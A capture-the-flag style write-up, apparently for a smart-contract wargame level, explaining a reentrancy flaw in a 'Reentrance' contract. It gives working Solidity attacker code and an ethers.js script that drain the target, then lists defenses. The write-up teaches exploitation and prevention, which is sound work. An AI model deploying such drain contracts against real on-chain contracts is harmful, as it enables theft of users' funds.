# Level 10: Reentrancy

## Challenge Overview

This challenge demonstrates a classic reentrancy vulnerability.  
The goal is to exploit the `Reentrance` contract by repeatedly withdrawing Ether to drain its balance.

## Goal

- Exploit the `withdraw` function of the `Reentrance` contract to drain all of its funds.

## Solution

The `withdraw` function in the `Reentrance` contract is vulnerable because it transfers Ether to the caller **before** updating the internal balance.  
This allows a malicious contract to repeatedly call `withdraw` and drain the funds.

### Steps:

#### 1. Deploy a malicious contract with the following code

```solidity
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentrancyAttack {
    address payable public target;

    constructor(address payable _target) {
        target = _target;
    }

    function attack() external payable {
        IReentrance(target).donate{value: msg.value}(address(this));
        IReentrance(target).withdraw(msg.value);
    }

    fallback() external payable {
        if (address(target).balance >= msg.value) {
            IReentrance(target).withdraw(msg.value);
        }
    }
}
```

#### 2. Deploy the `ReentrancyAttack` contract and fund it with Ether to start the attack.

#### 3. Call the `attack` function to drain the `Reentrance` contract

```javascript
const ReentrancyAttack = await ethers.getContractFactory("ReentrancyAttack");
const attacker = await ReentrancyAttack.deploy(targetAddress);
await attacker.attack({ value: ethers.utils.parseEther("0.1") });
```

#### 4. Verify that the target contract’s balance is now zero.

---

## Lessons Learned

- Always update state variables before making external calls.
- Use the **checks-effects-interactions** pattern to avoid reentrancy vulnerabilities.
- Consider using reentrancy guards (`nonReentrant` modifiers) to prevent recursive calls.
